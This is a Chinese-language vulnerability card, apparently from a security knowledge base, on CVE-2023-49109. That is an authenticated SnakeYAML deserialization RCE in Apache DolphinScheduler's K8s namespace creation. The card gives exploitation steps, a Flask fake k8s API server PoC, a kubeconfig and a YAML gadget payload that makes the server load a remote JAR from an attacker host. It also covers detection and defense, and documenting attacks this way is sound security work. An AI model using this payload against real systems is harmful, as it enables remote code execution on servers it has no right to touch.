---
id: web-java-deserialization-dolphinscheduler-k8s-namespace-snakeyaml-loadas-rce
title: Apache DolphinScheduler K8s 命名空间 SnakeYAML loadAs 反序列化 RCE（CVE-2023-49109）：伪造 k8s API 绕过 namespace 存在校验
type: scenario
domain: web
path: web/java/deserialization
technique: dolphinscheduler-k8s-namespace-snakeyaml-loadas-rce
tags:
- java
- dolphinscheduler
- snakeyaml
- yaml
- k8s
- deserialization
- cve-2023-49109
- scriptenginemanager
- urlclassloader
- rce
cve:
- CVE-2023-49109
severity: critical
confidence: high
affected_versions: '原文标注：3.2.0（SnakeYAML 1.33，存在 CVE-2022-1471）；官方修复 PR #14991 移除 upsertNamespacedResourceToK8s 相关代码'
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V507
  verified_at: '2026-11-11T04:44:50+08:00'
  notes: '已对照13419原文与全部10图核对：图06 PR #14991 diff 红框为 yaml.loadAs(yamlStr, ResourceQuota.class)；原文明确 3.2.0 使用 SnakeYAML 1.33 并判定存在 CVE-2022-1471；图07 集群管理 kubeconfig server=http://127.0.0.1:5000 伪造 API；图08 K8S 命名空间创建填入 !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://jifm.callback.red"]]]]；图09 callback.red 收到含恶意 namespace 的 /api/v1/namespaces/.../resourcequotas/... 请求，验证 checkNamespaceToK8s 绕过与 loadAs 触发。卡片技术点、gadget 流程（URLClassLoader→ScriptEngineManager→ServiceLoader 加载 ScriptEngineFactory）、前提（集群管理/命名空间权限、伪造 API 可达、可出网）与原文一致；affected_versions 按原文标注 3.2.0/SnakeYAML 1.33，未臆测区间。dedup：与 TarzanCMS SnakeYAML ScriptEngineManager（不同产品入口/theme.yaml）共用 gadget 但入口、绕过（伪造 k8s API）与 sink（ResourceQuota loadAs）不同，非同链；库内无其他 DolphinScheduler 卡。无 sources/source_url；未复跑 PoC。'
url: /docs/web/java/deserialization/web-java-deserialization-dolphinscheduler-k8s-namespace-snakeyaml-loadas-rce/
draft: false
kb_aliases:
- CVE-2023-49109
- DolphinScheduler SnakeYAML
- genDefaultResourceYaml
- upsertNamespacedResourceToK8s
- checkNamespaceToK8s 绕过
- 伪造 k8s API Server
- ScriptEngineManager URLClassLoader
---

## 一句话结论

Apache DolphinScheduler 创建 K8s 命名空间时，`genDefaultResourceYaml()` 会把用户可控的 namespace 拼进 YAML，`upsertNamespacedResourceToK8s()` 再用 SnakeYAML 1.33 的 `yaml.loadAs(yamlStr, ResourceQuota.class)` 解析；攻击者先用自己的伪造 k8s API Server 让 `checkNamespaceToK8s()` 认为恶意 namespace 存在，再把 namespace 设为 `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker"]]]]`，即可触发 SnakeYAML 反序列化（CVE-2022-1471），通过 URLClassLoader 远程加载 JAR 执行代码。

## 原理

- **入口与参数拼接**：K8s 命名空间管理功能创建命名空间时，若非本地测试集群，会调用 `genDefaultResourceYaml(k8sNamespaceObj)` 生成资源配额 YAML；该方法把 `k8sNamespace.getNamespace()` 同时替换进 `${name}` 与 `${namespace}` 两个占位符，未对 namespace 做 DNS-1123 或 YAML 特殊字符校验。
- **sink 是 SnakeYAML loadAs**：`k8sClientService.upsertNamespacedResourceToK8s()` 内部执行 `yaml.loadAs(yamlStr, ResourceQuota.class)`。DolphinScheduler 3.2.0 使用的 SnakeYAML 1.33 仍受 CVE-2022-1471 影响：`loadAs` 默认构造器支持 `!!类名` 全局标签，可实例化任意类并调用其构造方法/属性 setter，而不只是反序列化到 `ResourceQuota`。
- **ScriptEngineManager gadget**：YAML 中写入 `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]` 时，SnakeYAML 会构造一个指向攻击者地址的 `URLClassLoader`，再用它构造 `ScriptEngineManager`；`ScriptEngineManager` 构造过程通过 `ServiceLoader` 从该 ClassLoader 加载 `ScriptEngineFactory` 实现，触发远程 JAR 的类加载与构造方法执行（可在 JAR 中实现 `ScriptEngineFactory` 接口执行任意代码）；仅触发 URL 请求时也可用 DNS/HTTP 日志确认漏洞存在。
- **为什么要伪造 k8s API**：进入 sink 前有一层 `checkNamespaceToK8s(namespace, clusterCode)`，它会查询配置的 k8s 集群中是否存在该 namespace；正常集群中不可能存在名为 `!!javax.script...` 的 namespace。攻击者可在“安全中心 → 集群管理”新增/编辑一个集群，把 kubeconfig 的 `server` 指向自己启动的伪造 API Server（如 Flask），让它返回包含恶意 namespace 名的 `NamespaceList`，从而通过存在性校验。
- **利用前提**：需要拥有集群管理/K8s 命名空间创建权限的账号（平台管理员或具备相应安全中心权限），因此属于“认证后 RCE”；伪造 API Server 必须能被 DolphinScheduler 服务端访问；触发远程 JAR 还需要服务端能出网访问攻击者地址。

## 触发条件

- 目标 DolphinScheduler 版本包含该逻辑（原文为 3.2.0，SnakeYAML 1.33）。
- 攻击者账号具备集群管理（新增/编辑集群）与 K8s 命名空间创建权限。
- 能提供一个 DolphinScheduler 服务端可访问的伪造 k8s API Server，返回包含恶意 namespace 名的 NamespaceList。
- 服务端可出网到攻击者 JAR/回调地址（或至少能发起 DNS/HTTP 请求）。

## 利用步骤

1. 启动伪造的 k8s API Server（如 Flask），实现 `GET /api/v1/namespaces`，返回 `NamespaceList`，其中 `items[].metadata.name` 为恶意 YAML 标签字符串。
2. 登录 DolphinScheduler，在“安全中心 → 集群管理”新增集群，Kubernetes 配置的 `server` 指向伪造 API Server（原文示例 `http://127.0.0.1:5000`），保存。
3. 进入“K8S 命名空间管理 → 创建命名空间”，选择该集群，命名空间填
   `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]`。
4. 服务端生成 YAML → `checkNamespaceToK8s` 查询伪造 API，看到同名 namespace → 通过校验 → `yaml.loadAs` 解析到恶意标签 → 构造 URLClassLoader/ScriptEngineManager。
5. 观察回调日志确认触发；在攻击者地址托管含 `ScriptEngineFactory` 实现的 JAR，令其在加载/构造时执行命令，完成 RCE。
6. 验证时用无害行为（DNS/HTTP 回调或写临时文件）并遵守授权范围。

## PoC

```python
# 伪造 k8s API Server：返回包含恶意 namespace 名的 NamespaceList
from flask import Flask, jsonify

app = Flask(__name__)

@app.route('/api/v1/namespaces', methods=['GET'])
def get_namespaces():
    return jsonify({
        "kind": "NamespaceList",
        "apiVersion": "v1",
        "items": [{
            "metadata": {
                "name": '!!javax.script.ScriptEngineManager '
                        '[!!java.net.URLClassLoader '
                        '[[!!java.net.URL ["http://attacker/"]]]]'
            }
        }]
    })

if __name__ == '__main__':
    app.run(debug=True)
```

```yaml
# 集群配置中的 kubeconfig server 指向伪造 API
clusters:
- cluster:
    server: http://127.0.0.1:5000
  name: kubernetes
contexts:
- context:
    cluster: kubernetes
  name: kubernetes-admin@kubernetes
current-context: kubernetes-admin@kubernetes
kind: Config
```

```text
# 触发用的 namespace 名（YAML 全局标签）
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]
```

## 变体与关联

- 变体：SnakeYAML 其他全局标签 gadget（如 `!!javax.script.ScriptEngineManager` 之外的类构造链）；若目标使用 SafeConstructor/2.x 则失效。
- 变体：若无法修改集群配置，可寻找其他能写入 namespace 或 YAML 字段的入口（导入、API）来绕过校验。
- 关联：[[web-java-deser-tarzancms-snakeyaml-scriptenginemanager-rce]]（同 gadget 的主题包上传链）、[[web-java-deserialization-snakeyaml-loadas-blacklist-double-encode-file-xml]]（SnakeYAML loadAs 黑名单/双编码绕过）、[[web-java-rce-ruoyi-job-invoke-target-reflection-snakeyaml]]（调度系统里的 yaml-payload 组合）。
- 边界：DolphinScheduler 已升级到修复版本（移除 upsert 逻辑/使用安全 YAML）、集群配置权限受限、伪造 API 不可达、服务端无法出网、namespace 被 DNS-1123 严格校验时，利用失败。

## 检测与防御

- 检测：集群管理中出现指向非预期 `server` 的 kubeconfig；K8s 命名空间名包含 `!!`、`[`、`]`、`java.net.URL` 等 YAML 标签特征；服务端进程向陌生域名发起 JAR/HTTP 请求或出现异常类加载。
- 防御：升级 DolphinScheduler 修复版本；使用 SnakeYAML 的 `SafeConstructor` 或 2.x，禁止 `!!` 全局标签与任意类实例化。
- 加固：限制集群管理/命名空间创建权限并做审批；对 namespace 做 DNS-1123 严格校验；限制 DolphinScheduler 服务端出网；审计集群配置变更与异常 JAR 下载。
